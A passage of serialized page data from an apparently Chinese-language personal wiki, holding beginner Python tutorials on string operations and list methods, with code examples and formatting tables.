0\n\n\n1\n2\n\n\n如果想要将多个字符串拼接起来，可以使用+或者直接将两组引号放到一起。如果想要将字符串复制多份，可以使用类似数学操作的乘法。在其他语言中，可能需要写一个循环来实现。\n\na = \'hello\'\nb = \'world\'\n\nc = a+b\nd = \'hello\'\'world\'\n\nprint(c) # helloworld\nprint(d) # helloworld\n\nprint(a*3) # hellohellohello\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n我们在使用print打印字符串时，默认是换行打印的。print函数有一个end参数，用来制定末尾添加的内容，如果指定了这个参数，就会以改参数结尾。\n\nprint("helloworld")\nprint("!!!!!") # helloworld 换行 !!!!!!\n\nprint("helloworld",end=\'\')\nprint("!!!!!") # helloworld!!!!!\n\n\n1\n2\n3\n4\n5\n\n\n可以使用input函数读入控制台的输入，input函数的参数中可以传递一个字符串，用于引导用户输入。\n\nuser_age = input("请输入您的年龄：")\nprint(user_age)\n\n\n1\n2\n\n\n\n# 操作字符串的方法们\n\n\n# str() 将数字转化为字符串\n\nprint函数会将一个字符串输出到输出设备中，也就是在控制台打印。如果print函数的参数不是字符串，是其他对象，那么编译器就会自动调用str将飞字符串对象转化为字符串。我们也可以自己调用str实现数字转化为字符串。\n\nnum = 200\nnum_str = str(20.1)\nprint(num)\n\n\n1\n2\n3\n\n\n注意：我这里出现了一个问题，上面我们在定义字符串的时候使用过str作为变量。那么在这里使用str函数转换数字的时候，就会报一个错，提示TypeError: \'str\' object is not callable。这个在其他操作语言中同样存在的问题，我们在编写程序时，不要使用系统的保留字，并且避免和常用的函数同名。\n\n\n# [] 提取字符串和字符串切片\n\n字符串的本质是字符序列，我们在字符串后添加[]，指定偏移量可以获取该位置的字符串。这个和数组的操作类似。Python中的字符串也支持倒序，即索引为负数。\n\n字符串切片操作可以让我们快速获取字符串的子串，语法如下：\n\n操作                                              示例                结果\n[:] 获取整个串                                       "abcdef"[:]       "Abcdef"\n[start : ] 从start开始到结尾                          "abcdef"[2:]      "cdef"\n[: end ]从头开始到end - 1                            "Abcdef"[:2]      "ab"\n[start : end]从start 开始到 end - 1                 "abcdef"[2:4]     "cd"\n[start : end : step ]从start开始到end - 1 步长为step   "abcdef"[1:5:2]   "bd"\n\n当start或end为负数的情况：\n\n示例                                     说明                    结果\n"abcdefghijklmnopqrstuv wxyz"[-3:]     倒数三个                  “xyz”\n"abcdefghijklmnopqrstuv wxyz"[-8:-3]   倒数第八个到倒数第 三个(包头不包尾)   \'stuvw\'\n"abcdefghijklmnopqrstuv wxyz"[::-1]    步长为负， 从右到左 反向提取       \'zyxwvutsrqpon mlkjihgfedcba\'\n\n\n# 字符串切割和合并\n\nsplit函数可以拆分字符串，join可以合并字符串。split默认使用空格拆分字符串。也可以指定拆分的参数。使用join合并字符串比使用+拼接字符串更高效。\n\na = "hello world ! ! ! !"\nprint(a.split()) #[\'hello\', \'world\', \'!\', \'!\', \'!\', \'!\']\nprint(a.split("world")) #[\'hello \', \' ! ! ! !\']\n\na = [\'hello\',\'world\',\'zhangsan\',\'lisi\']\nprint("*".join(a)) # hello*world*zhangsan*lisi\n\n\n1\n2\n3\n4\n5\n6\n\n\n\n# 字符串比较\n\n== != 判断是否含有相同的字符\n\nis not is 判断是否是同一个对象\n\nin not in 判断子串关系\n\nprint( " hello" == " hello") #True\nprint("hello" != "world") # True\na = "hello" \nb = "world"\nprint(a is b) # False\nprint(a is not b) # True\nprint("hello" in "==helloworld") # True\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n在Python中有一个字符串驻留机制，仅保留一份相同的且不肯遍的字符串方法。对于字符串（仅包含下划线、字母数字）会启用字符串驻留机制。\n\na = "aaa_3"\nb = "aaa_3"\nprint(a is b) # True\n\n\n1\n2\n3\n\n\n\n# 字符串查找\n\n方法                   说明             结果\nlen(a)               字符串长度          int\na.startwith("aaa")   以指定位置开始        bool\na.endwith("aaa")     以指定位置结尾        bool\na.find(\'a\')          首次出现字符串的位置     int\na.rfind(\'b\')         最后一次出现字符串的位置   int\na.count(\'aaa\')       指定字符串出现的次数     int\na.isalnum()          全部是数字或字母       bool\na.isalpha()          是否只有字母         bool\na.isdigit()          是否只有数字         bool\na.isspace()          是否为空白          bool\na.isupper()          是否为大写          bool\na.islower()          是否为小写          bool\n\n\n# 去除首尾信息\n\n我们可以通过strip去除首尾指定的内容，lstrip去除首部内容，rstrip去除尾部指定的内容。\n\na = "   helloworld   "\nprint(a.strip(" ")) #helloworld\n\na = "* helloworld -"\nprint(a.lstrip("*").rstrip("-").strip(" ")) #helloworld\n\n\n1\n2\n3\n4\n5\n\n\n\n# 大小写转换\n\n示例               说明                  结果\na.capitalize()   产生新的字符串，首字母大写       \na.title()        产生新的字符串，每个单词首字母大写   \na.upper()        产生新的字符串，所有字符大写      \na.lower()        产生新的字符串，所有单词小写      \na.swapcase()     产生新的字符串，所有字符大小写转换   \n\na = "hello, WORLD"\nprint(a.capitalize()) #Hello, world\nprint(a.title()) # Hello, World\nprint(a.upper()) # HELLO, WORLD\nprint(a.lower()) # hello, world\nprint(a.swapcase()) # HELLO, world\n\n\n1\n2\n3\n4\n5\n6\n\n\n\n# 字符串格式\n\n可以使用center\\ljust\\rjust调整字符串的输出排版。\n\na = "abc"\nprint(a.center(10, "-")) # ---abc----\nprint(a.ljust(10, "-")) # abc-------\nprint(a.rjust(10, "-")) # -------abc\n\n\n1\n2\n3\n4\n\n\nPython2.6开始，可以使用str.format方式进行字符串格式化。\n\na = "姓名：{0},年龄：{1}".format("zhangsan",22)\nprint(a) # 姓名：zhangsan,年龄：22\n\na = "姓名：{name},年龄：{age}".format(name="zhangsan",age=22)\nprint(a) # 姓名：zhangsan,年龄：22\n\n\n1\n2\n3\n4\n5\n\n\nformat同时支持一些特殊的格式化。\n\nprint("{:*>8}".format("a")) # *******a\n\n# : 指定填充的内容 ， > < ^ 分别代表右对齐，左对齐，居中 数字代表宽度\n\n\n1\n2\n3\n\n\n数字的格式化方式和C语言中类似，java中使用Printf也同样支持类似的格式化方式：\n\n数字           格式        输出          描述\n3.1415926    {:.2f}    3.14        保留小数点后两位\n3.1415926    {:+.2f}   3.14        带符号保留小数点后两位\n2.71828      {:.0f}    3           不带小数\n5            {:0>2d}   05          数字补零 (填充左边, 宽度为 2)\n5            {:x<4d}   5xxx        数字补 x (填充右边, 宽度为 4)\n10           {:x<4d}   10xx        数字补 x (填充右边, 宽度为 4)\n1000000      {:,}      1,000,000   以逗号分隔的数字格式\n0.25         {:.2%}    25.00%      百分比格式\n1000000000   {:.2e}    1.00E+09    指数记法\n13           {:10d}    13          右对齐 (默认, 宽度为 10)\n13           {:<10d}   13          左对齐 (宽度为 10)\n13           {:^10d}   13          中间对齐 (宽度为 10)\n\n\n# 可变字符串\n\npython中的字符串不支持修改，需要修改的话需要重新创建一个字符串。可以使用ioh或者array模块，动态修改。\n\nimport io\ns = "hello.txt"\nsio = io.StringIO(s)\n\nprint(sio) # <_io.StringIO object at 0x7fdc180abd90>\n\nprint(sio.getvalue()) # hello.txt\n\nsio.seek(7)\nsio.write("g")\nprint(sio.getvalue()) # hello.tgt\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\n----------------------------------------\n\n就到这里吧，后面学了其他骚操作会继续补充到这里的。',normalizedContent:'# python字符串的那些事\n\n> 怎么说呢。。。python的语法糖真的是太多了，字符串操作的各种方法简直是秀了我一脸，记也记不住。找个地方写下来吧，好记性不如烂笔头嘛。\n\n\n# 创建一个字符串\n\n字符串应该是在学习一门编程语言时最先接触到的东西，“helloworld”就是一个字符串。各个语言中的字符串有所差异，在python中，字符串的本质就是字符序列。python中不支持单个字符的类型，比如像\'a\',在python中也是作为一个字符串使用的。\n\n在python3中，字符串默认使用16位的unicode编码，使用ord和chr函数，可以将字符串和编码做转换。、\n\nprint(chr(65))  # a\nprint(ord(\'a\')) # 65\n\n\n1\n2\n\n\n我们可以使用 单引号、双引号创建字符串。使用单引号或双引号嵌套创建的字符串中可以包含另一种引号，起到了转义引号的作用。同时，使用三个引号开始创建字符串，可以保留字符串的格式，这种方式也经常作为多行注释使用。\n\nstr = \'"hello",world\'\nprint(str)  # "hello",world\n\nstr = \'hello\\nworld\'\nprint(str)  # hello 换行 world\n\nstr = "hello\\nworld"\nprint(str) #"hello",world\n\nstr = """\n    public static void main(string[] args){\n        system.out.println("hello world!");    \n    }\n"""\n\nprint(str)\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\n如果要创建一个空的字符串，只需要在引号中不填写任何内容就可以了，这在许多其他的编程语言中也是一样的。len(str)用于获取字符串的长度。\n\nstr = \'\'\nprint(len(str))  # 0\n\n\n1\n2\n\n\n如果想要将多个字符串拼接起来，可以使用+或者直接将两组引号放到一起。如果想要将字符串复制多份，可以使用类似数学操作的乘法。在其他语言中，可能需要写一个循环来实现。\n\na = \'hello\'\nb = \'world\'\n\nc = a+b\nd = \'hello\'\'world\'\n\nprint(c) # helloworld\nprint(d) # helloworld\n\nprint(a*3) # hellohellohello\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n我们在使用print打印字符串时，默认是换行打印的。print函数有一个end参数，用来制定末尾添加的内容，如果指定了这个参数，就会以改参数结尾。\n\nprint("helloworld")\nprint("!!!!!") # helloworld 换行 !!!!!!\n\nprint("helloworld",end=\'\')\nprint("!!!!!") # helloworld!!!!!\n\n\n1\n2\n3\n4\n5\n\n\n可以使用input函数读入控制台的输入，input函数的参数中可以传递一个字符串，用于引导用户输入。\n\nuser_age = input("请输入您的年龄：")\nprint(user_age)\n\n\n1\n2\n\n\n\n# 操作字符串的方法们\n\n\n# str() 将数字转化为字符串\n\nprint函数会将一个字符串输出到输出设备中，也就是在控制台打印。如果print函数的参数不是字符串，是其他对象，那么编译器就会自动调用str将飞字符串对象转化为字符串。我们也可以自己调用str实现数字转化为字符串。\n\nnum = 200\nnum_str = str(20.1)\nprint(num)\n\n\n1\n2\n3\n\n\n注意：我这里出现了一个问题，上面我们在定义字符串的时候使用过str作为变量。那么在这里使用str函数转换数字的时候，就会报一个错，提示typeerror: \'str\' object is not callable。这个在其他操作语言中同样存在的问题，我们在编写程序时，不要使用系统的保留字，并且避免和常用的函数同名。\n\n\n# [] 提取字符串和字符串切片\n\n字符串的本质是字符序列，我们在字符串后添加[]，指定偏移量可以获取该位置的字符串。这个和数组的操作类似。python中的字符串也支持倒序，即索引为负数。\n\n字符串切片操作可以让我们快速获取字符串的子串，语法如下：\n\n操作                                              示例                结果\n[:] 获取整个串                                       "abcdef"[:]       "abcdef"\n[start : ] 从start开始到结尾                          "abcdef"[2:]      "cdef"\n[: end ]从头开始到end - 1                            "abcdef"[:2]      "ab"\n[start : end]从start 开始到 end - 1                 "abcdef"[2:4]     "cd"\n[start : end : step ]从start开始到end - 1 步长为step   "abcdef"[1:5:2]   "bd"\n\n当start或end为负数的情况：\n\n示例                                     说明                    结果\n"abcdefghijklmnopqrstuv wxyz"[-3:]     倒数三个                  “xyz”\n"abcdefghijklmnopqrstuv wxyz"[-8:-3]   倒数第八个到倒数第 三个(包头不包尾)   \'stuvw\'\n"abcdefghijklmnopqrstuv wxyz"[::-1]    步长为负， 从右到左 反向提取       \'zyxwvutsrqpon mlkjihgfedcba\'\n\n\n# 字符串切割和合并\n\nsplit函数可以拆分字符串，join可以合并字符串。split默认使用空格拆分字符串。也可以指定拆分的参数。使用join合并字符串比使用+拼接字符串更高效。\n\na = "hello world ! ! ! !"\nprint(a.split()) #[\'hello\', \'world\', \'!\', \'!\', \'!\', \'!\']\nprint(a.split("world")) #[\'hello \', \' ! ! ! !\']\n\na = [\'hello\',\'world\',\'zhangsan\',\'lisi\']\nprint("*".join(a)) # hello*world*zhangsan*lisi\n\n\n1\n2\n3\n4\n5\n6\n\n\n\n# 字符串比较\n\n== != 判断是否含有相同的字符\n\nis not is 判断是否是同一个对象\n\nin not in 判断子串关系\n\nprint( " hello" == " hello") #true\nprint("hello" != "world") # true\na = "hello" \nb = "world"\nprint(a is b) # false\nprint(a is not b) # true\nprint("hello" in "==helloworld") # true\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n在python中有一个字符串驻留机制，仅保留一份相同的且不肯遍的字符串方法。对于字符串（仅包含下划线、字母数字）会启用字符串驻留机制。\n\na = "aaa_3"\nb = "aaa_3"\nprint(a is b) # true\n\n\n1\n2\n3\n\n\n\n# 字符串查找\n\n方法                   说明             结果\nlen(a)               字符串长度          int\na.startwith("aaa")   以指定位置开始        bool\na.endwith("aaa")     以指定位置结尾        bool\na.find(\'a\')          首次出现字符串的位置     int\na.rfind(\'b\')         最后一次出现字符串的位置   int\na.count(\'aaa\')       指定字符串出现的次数     int\na.isalnum()          全部是数字或字母       bool\na.isalpha()          是否只有字母         bool\na.isdigit()          是否只有数字         bool\na.isspace()          是否为空白          bool\na.isupper()          是否为大写          bool\na.islower()          是否为小写          bool\n\n\n# 去除首尾信息\n\n我们可以通过strip去除首尾指定的内容，lstrip去除首部内容，rstrip去除尾部指定的内容。\n\na = "   helloworld   "\nprint(a.strip(" ")) #helloworld\n\na = "* helloworld -"\nprint(a.lstrip("*").rstrip("-").strip(" ")) #helloworld\n\n\n1\n2\n3\n4\n5\n\n\n\n# 大小写转换\n\n示例               说明                  结果\na.capitalize()   产生新的字符串，首字母大写       \na.title()        产生新的字符串，每个单词首字母大写   \na.upper()        产生新的字符串，所有字符大写      \na.lower()        产生新的字符串，所有单词小写      \na.swapcase()     产生新的字符串，所有字符大小写转换   \n\na = "hello, world"\nprint(a.capitalize()) #hello, world\nprint(a.title()) # hello, world\nprint(a.upper()) # hello, world\nprint(a.lower()) # hello, world\nprint(a.swapcase()) # hello, world\n\n\n1\n2\n3\n4\n5\n6\n\n\n\n# 字符串格式\n\n可以使用center\\ljust\\rjust调整字符串的输出排版。\n\na = "abc"\nprint(a.center(10, "-")) # ---abc----\nprint(a.ljust(10, "-")) # abc-------\nprint(a.rjust(10, "-")) # -------abc\n\n\n1\n2\n3\n4\n\n\npython2.6开始，可以使用str.format方式进行字符串格式化。\n\na = "姓名：{0},年龄：{1}".format("zhangsan",22)\nprint(a) # 姓名：zhangsan,年龄：22\n\na = "姓名：{name},年龄：{age}".format(name="zhangsan",age=22)\nprint(a) # 姓名：zhangsan,年龄：22\n\n\n1\n2\n3\n4\n5\n\n\nformat同时支持一些特殊的格式化。\n\nprint("{:*>8}".format("a")) # *******a\n\n# : 指定填充的内容 ， > < ^ 分别代表右对齐，左对齐，居中 数字代表宽度\n\n\n1\n2\n3\n\n\n数字的格式化方式和c语言中类似，java中使用printf也同样支持类似的格式化方式：\n\n数字           格式        输出          描述\n3.1415926    {:.2f}    3.14        保留小数点后两位\n3.1415926    {:+.2f}   3.14        带符号保留小数点后两位\n2.71828      {:.0f}    3           不带小数\n5            {:0>2d}   05          数字补零 (填充左边, 宽度为 2)\n5            {:x<4d}   5xxx        数字补 x (填充右边, 宽度为 4)\n10           {:x<4d}   10xx        数字补 x (填充右边, 宽度为 4)\n1000000      {:,}      1,000,000   以逗号分隔的数字格式\n0.25         {:.2%}    25.00%      百分比格式\n1000000000   {:.2e}    1.00e+09    指数记法\n13           {:10d}    13          右对齐 (默认, 宽度为 10)\n13           {:<10d}   13          左对齐 (宽度为 10)\n13           {:^10d}   13          中间对齐 (宽度为 10)\n\n\n# 可变字符串\n\npython中的字符串不支持修改，需要修改的话需要重新创建一个字符串。可以使用ioh或者array模块，动态修改。\n\nimport io\ns = "hello.txt"\nsio = io.stringio(s)\n\nprint(sio) # <_io.stringio object at 0x7fdc180abd90>\n\nprint(sio.getvalue()) # hello.txt\n\nsio.seek(7)\nsio.write("g")\nprint(sio.getvalue()) # hello.tgt\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\n----------------------------------------\n\n就到这里吧，后面学了其他骚操作会继续补充到这里的。',charsets:{cjk:!0},lastUpdated:"2022/04/03, 12:13:15",lastUpdatedTimestamp:1648987995e3},{title:"Python序列的那些事",frontmatter:{title:"Python序列的那些事",date:"2022-03-22T12:00:00.000Z",permalink:"/sec/dev/python/sequence",author:{name:"p0jo",link:"https://wiki.pwddd.com"},categories:["安全开发","Python"],tags:["Python"],readingShow:"top"},regularPath:"/02.%E5%AE%89%E5%85%A8/202.%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91/2020.Python/01.Python%E5%BA%8F%E5%88%97%E7%9A%84%E9%82%A3%E4%BA%9B%E4%BA%8B.html",relativePath:"02.安全/202.安全开发/2020.Python/01.Python序列的那些事.md",key:"v-711274d8",path:"/sec/dev/python/sequence/",headers:[{level:2,title:"列表",slug:"列表",normalizedTitle:"列表",charIndex:74},{level:3,title:"创建列表",slug:"创建列表",normalizedTitle:"创建列表",charIndex:1007},{level:3,title:"新增元素",slug:"新增元素",normalizedTitle:"新增元素",charIndex:1970},{level:3,title:"删除元素",slug:"删除元素",normalizedTitle:"删除元素",charIndex:489},{level:3,title:"查看元素",slug:"查看元素",normalizedTitle:"查看元素",charIndex:3569},{level:3,title:"列表切片[]",slug:"列表切片",normalizedTitle:"列表切片[]",charIndex:6183},{level:3,title:"其他列表函数",slug:"其他列表函数",normalizedTitle:"其他列表函数",charIndex:7119},{level:3,title:"多维列表",slug:"多维列表",normalizedTitle:"多维列表",charIndex:7579},{level:2,title:"元组",slug:"元组",normalizedTitle:"元组",charIndex:77},{level:3,title:"创建元组",slug:"创建元组",normalizedTitle:"创建元组",charIndex:7986},{level:3,title:"元素访问和计数",slug:"元素访问和计数",normalizedTitle:"元素访问和计数",charIndex:9291},{level:2,title:"字典",slug:"字典",normalizedTitle:"字典",charIndex:80},{level:3,title:"创建字典",slug:"创建字典",normalizedTitle:"创建字典",charIndex:10221},{level:3,title:"字典元素的访问",slug:"字典元素的访问",normalizedTitle:"字典元素的访问",charIndex:11044},{level:3,title:"字典增删改",slug:"字典增删改",normalizedTitle:"字典增删改",charIndex:11542},{level:3,title:"语法糖 之 序列解包",slug:"语法糖-之-序列解包",normalizedTitle:"语法糖 之 序列解包",charIndex:12684},{level:3,title:"列表结合字典存储和访问数据",slug:"列表结合字典存储和访问数据",normalizedTitle:"列表结合字典存储和访问数据",charIndex:13226},{level:3,title:"字典底层原理",slug:"字典底层原理",normalizedTitle:"字典底层原理",charIndex:13771},{level:2,title:"集合",slug:"集合",normalizedTitle:"集合",charIndex:83},{level:3,title:"集合的相关操作",slug:"集合的相关操作",normalizedTitle:"集合的相关操作",charIndex:14279},{level:2,title:"参考资料",slug:"参考资料",normalizedTitle:"参考资料",charIndex:15419}],excerpt:'<h1 id="python序列的那些事"><a class="header-anchor" href="#python序列的那些事">#</a> Python序列的那些事</h1>\n<blockquote>\n<p>接上一篇的《Python字符串的那些事》，这篇准备整理一下 Python 中的序列类型的基础用法，包含：字符串、列表、元组、字典、集合。后续有相关的深入了解，也会更新到这里。字符串在上一篇说过，这里就不再赘述。</p>\n</blockquote>\n',headersStr:"列表 创建列表 新增元素 删除元素 查看元素 列表切片[] 其他列表函数 多维列表 元组 创建元组 元素访问和计数 字典 创建字典 字典元素的访问 字典增删改 语法糖 之 序列解包 列表结合字典存储和访问数据 字典底层原理 集合 集合的相关操作 参考资料",content:"# Python序列的那些事\n\n> 接上一篇的《Python字符串的那些事》，这篇准备整理一下 Python 中的序列类型的基础用法，包含：字符串、列表、元组、字典、集合。后续有相关的深入了解，也会更新到这里。字符串在上一篇说过，这里就不再赘述。\n\n\n# 列表\n\n列表是可以存储 任意数目、任意类型的数据集合。列表内置了可变的序列，包含多个元素的 有序且连续的 内存空间。定义方式如：a = [1,2,3,4]。其中1、2、3、4为列表a的元素，元素中存储的数据类型可以任意，不比一定相同。列表有如下的一些常用方法：\n\n方法                     要点       描述\nlist.append(x)         增加元素     将元素 x 增加到列表 list 尾部\nlist.extend(aList)     增加元素     将列表 alist 所有元素加到列表 list 尾部\nlist.insert(index,x)   增加元素     在列表 list 指定位置 index 处插入元素 x\nlist.remove(x)         删除元素     在列表 list 中删除首次出现的指定元素 x\nlist.pop([index])      删除元素     删除并返回列表 list 指定为止 index 处的元素，默认是 最后一个元素\nlist.clear()           删除所有元素   删除列表所有元素，并不是删除列表对象\nlist.index(x)          访问元素     返回第一个 x 的索引位置，若不存在 x 元素抛出异常\nlist.count(x)          计数       返回指定元素 x 在列表 list 中出现的次数\nlen(list)              列表长度     返回列表中包含元素的个数\nlist.reverse()         翻转列表     所有元素原地翻转\nlist.sort()            排序       所有元素原地排序\nlist.copy()            浅拷贝      返回列表对象的浅拷贝\n\n字符串和列表类似，都是序列的类型。字符串存储的是相同字符类型的序列，而列表是存储任意类型的序列。因此，字符串的一些用法在列表上也是一样的。\n\n\n# 创建列表\n\n创建列表有多种方式，这里整理了四种：\n\n 1. 基本的创建方式\n    \n    a = [1,2,3,\"hello\",\"world\",True]\n    a = [] # 创建空列表\n    \n    \n    1\n    2\n    \n\n 2. 使用list() 创建\n    \n    a = list() # 创建空列表\n    a = list(1,2,3,\"aaa\",True)\n    \n    \n    1\n    2\n    \n\n 3. 使用range() 创建\n    \n    # range可以帮助我们创建整数数组，这在for循环中有大用处。\n    # range语法格式为：range(start,end,step)\n    # start: 可选，起始位置，默认为0\n    # end: 必选，结束位置\n    # step ： 步长，可选，默认为1\n    \n    # 在python3 中range返回一个range对象，而不是一个列表，我们需要通过list方法将其转化为列表\n    \n    a = range(5)\n    print(a) # range(0, 5)\n    b = list(range(5))\n    print(b) # [0, 1, 2, 3, 4]\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    9\n    10\n    11\n    12\n    \n\n 4. 使用推导式生成列表\n    \n    # 使用for推导式的方式生成数组，在开发中也比较常见。\n    # 基本的使用方式如下：\n    a = [x*2 for x in range(5)]\n    print(a) # [0, 2, 4, 6, 8]\n    \n    b = [x*2 for x in range(100) if x%10 == 0]\n    print(b) # [0, 20, 40, 60, 80, 100, 120, 140, 160, 180]\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    \n\n\n# 新增元素\n\n列表是一个可变的序列，如果出现新增和删除元素时，python会自动进行内存管理，极大的减少了程序员的负担。但是因为是连续的有序内存空间，所以在一些位置插入删除元素效率比较低，我们通常在列表尾部删除和插入元素。\n\n 1. append() 表尾添加元素\n    \n    a = [1,2]\n    a.append(3)\n    print(a)\n    \n    \n    1\n    2\n    3\n    \n\n 2. +运算符操作\n    \n    # + 运算符 并不是真正的往尾部添加元素，而是创建新对象将原列表复制到新列表中，效率太低\n    a = [1,2]\n    print(id(a)) # 140213503386560\n    a = a+[3,4]\n    print(id(a)) # 140213234351808\n    \n    \n    1\n    2\n    3\n    4\n    5\n    \n\n 3. Extend() 拓展列表\n    \n    # extend 完成两个列表的拼接，不产生新对象\n    a = [1,2]\n    print(id(a)) # 140335909954496\n    b = [3,4]\n    a.extend(b)\n    print(a) # [1, 2, 3, 4]\n    print(id(a)) # 140335909954496\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    \n\n 4. Insert() 插入元素\n    \n    # insert 可以在任意位置插入元素，但是这样会导致元素的移动，效率较低，避免在列表头部插入元素\n    a = [1,2,3,4]\n    a.insert(0,0)\n    print(a) # [0, 1, 2, 3, 4]\n    \n    \n    1\n    2\n    3\n    4\n    \n\n 5. 乘法复制\n    \n    # 乘法拓展 这比较的神奇 如果想复制一个列表，只需要使用乘法\n    # 在字符串中，同样可以使用乘法的方式复制字符串\n    \n    a = [\"zhangsan\",22]\n    b = a*3\n    print(b) # ['zhangsan', 22, 'zhangsan', 22, 'zhangsan', 22]\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    \n\n\n# 删除元素\n\n在列表中的删除也会导致元素的移动，因此尽量避免非尾部元素的删除，会导致效率太低。\n\n 1. del删除\n    \n    # del 删除指定位置的元素\n    a = [1,2,3,4]\n    del a[1] # [1, 3, 4]\n    print(a)\n    \n    \n    1\n    2\n    3\n    4\n    \n\n 2. pop出栈\n    \n    # pop出栈 默认从末尾删除，返回值为删除的元素；也可以传递index\n    a = [1,2,3,4]\n    b = a.pop(0)\n    print(a)\n    print(b)\n    \n    \n    1\n    2\n    3\n    4\n    5\n    \n\n 3. remove删除\n    \n    # remove 指定元素删除，删除第一个出现该元素的位置\n    a = [1,2,3,4]\n    a.remove(2)\n    print(a) # [1, 3, 4]\n    \n    \n    1\n    2\n    3\n    4\n    \n\n\n# 查看元素\n\nPython中的列表相对于Java中的数组，都可以通过idnex去访问一个元素。但是Java中的数组长度不可变，并且不可以存储任意的类型。\n\n 1. 通过索引访问元素\n    \n    # 通过索引访问元素 从0开始到len-1\n    a = [2,3,1,4,6,32,2,5,7,2]\n    print(a[0]) # 2\n    print(a[len(a)]) # 索引越界 IndexError: list index out of range\n    \n    \n    1\n    2\n    3\n    4\n    \n\n 2. Index() 获取元素的索引\n    \n    # index可以查找第一次出现某个元素的index，可以传入一个范围，使用的方式是：a.index(value,[start],[end])\n    a = [1,2,3,4,5,6,7,8,9,10]\n    print(a.index(1)) # 0\n    print(a.index(3,1,5)) # 2\n    print(a.index(11)) # ValueError: 11 is not in list\n    \n    \n    1\n    2\n    3\n    4\n    5\n    \n\n 3. Count() 获取元素出现的次数\n    \n    # count用于判断元素在列表中出现的次数,如果结果为0 则表示列表中没有这个元素\n    a = [1,2,3,3,3,4,3,2,1]\n    print(a.count(1)) # 2\n    print(a.count(10)) # 0\n    \n    \n    1\n    2\n    3\n    4\n    \n\n 4. len() 获取列表的长度\n    \n    # len 和字符串一样，len可以获取列表的长度\n    a = [1,2,3,4,5,6,7]\n    print(len(a)) # 7\n    \n    \n    1\n    2\n    3\n    \n\n 5. 判断列表中存在指定元素\n    \n    # 上面说如果一个元素的count不等于0 则该元素不在列表中。\n    # 还可以通过in进行简便判断\n    a = [1,2,3,5,6,7,8,9]\n    print(a.count(4) == 0) # True\n    print(4 in a) # False\n    \n    \n    1\n    2\n    3\n    4\n    5\n    \n\n 6. 遍历列表的内容\n    \n    # 使用for循环遍历\n    a = [1,2,3,4,5,6,7]\n    for x in a:\n        print(x,end=\",\") # 1,2,3,4,5,6,7,\n    \n    \n    1\n    2\n    3\n    4\n    \n\n 7. 列表排序\n    \n    # sort 排序 默认生序 降序则reverse=True  不新建列表，修改原列表\n    # 乱序 shuffle\n    \n    a = [1,3,2,4,5,2,6,8,10]\n    a.sort()\n    print(a) # [1, 2, 2, 3, 4, 5, 6, 8, 10]\n    a.sort(reverse=True)\n    print(a) # [10, 8, 6, 5, 4, 3, 2, 2, 1]\n    \n    import random\n    random.shuffle(a)\n    print(a) # [6, 5, 2, 4, 3, 10, 1, 8, 2]\n    \n    # sorted 创建新列表，不修改原列表\n    a = [20,10,30,40,22]\n    b = sorted(a)\n    print(a) # [20, 10, 30, 40, 22]\n    print(b) # [10, 20, 22, 30, 40]\n    \n    b = sorted(a,reverse=True)\n    print(b) # [40, 30, 22, 20, 10]\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    9\n    10\n    11\n    12\n    13\n    14\n    15\n    16\n    17\n    18\n    19\n    20\n    21\n    \n\n 8. 列表迭代器\n    \n    # 存在一个内置函数reversed也可以对列表进行逆序，但是返回的是一个迭代器。\n    a = [10,2,11,9,13,22]\n    c = reversed(a)\n    print(c) # <list_reverseiterator object at 0x7fd528043fa0>\n    print(list(c))  # [22, 13, 9, 11, 2, 10]\n    \n    \n    1\n    2\n    3\n    4\n    5\n    \n\n 9. 列表复制\n    \n    # = 复制地址，list1和list2指向同一个地址\n    list1 = [1,2,3,4]\n    list2 = list1\n    \n    list2[0] = 0\n    print(list1) # [0, 2, 3, 4]\n    print(list2) # [0, 2, 3, 4]\n    \n    # 拼空列表复制\n    list2 = []+list1\n    list2[0] = 10\n    print(list1) # [0, 2, 3, 4]\n    print(list2) # [10, 2, 3, 4]\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    9\n    10\n    11\n    12\n    13\n    \n\n\n# 列表切片[]\n\n切片是Python中的重要操作，同时也适用于列表、元组、字符串。切片常见的语法格式是：\n\na[start:end:step]\n\n典型的操作如下：\n\n操作和说明                                       示例                               结果\n[:]提取整个列表                                   [10,20,30][:]                    [10,20,30]\n[start:]从 start 索引开始到 结尾                    [10,20,30][1:]                   [20,30]\n[:end]从头开始知道 end-1                          [10,20,30][:2]                   [10,20]\n[start:end]从 start 到 end-1                  [10,20,30,40][1:3]               [20,30]\n[start🔚step] 从 start 提 取到 end-1，步长是 step   [10,20,30,40,50,60,70][1:6: 2]   [20, 40, 60]\n[10,20,30,40,50,60,70][-3:]                 倒数三个                             [50,60,70]\n[10,20,30,40,50,60,70][-5:-3]               倒数第五个到倒数 第三个(包头不包尾)              [30,40]\n[10,20,30,40,50,60,70][::-1]                步长为负，从右到左 反向提取                   [70, 60, 50, 40, 30, 20, 10]\n\n切片操作时如果索引越界了也不会报错，如果start小于0会被看作0，如果end大于len-1会被看作len-1。\n\n\n# 其他列表函数\n\n 1. 求最大最小值\n    \n    # max 和 min用于求列表中的最大最小值\n    a = [1,2,3,4,5,6]\n    print(max(a)) # 6\n    print(min(a)) # 1\n    a = [1,\"a\",True]\n    print(max(a))\n    print(min(a)) # 不同类型元素比较会报错\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    \n\n 2. 元素求和\n    \n    a = [1,2,3,4,5,6,7,8]\n    print(sum(a)) # 36\n    a = ['a',1,2,3,True]\n    print(sum(a)) # TypeError: unsupported operand type(s) for +: 'int' and 'str'\n    \n    \n    1\n    2\n    3\n    4\n    \n\n\n# 多维列表\n\n一维列表可以帮助我们存储一维、线性的数据。 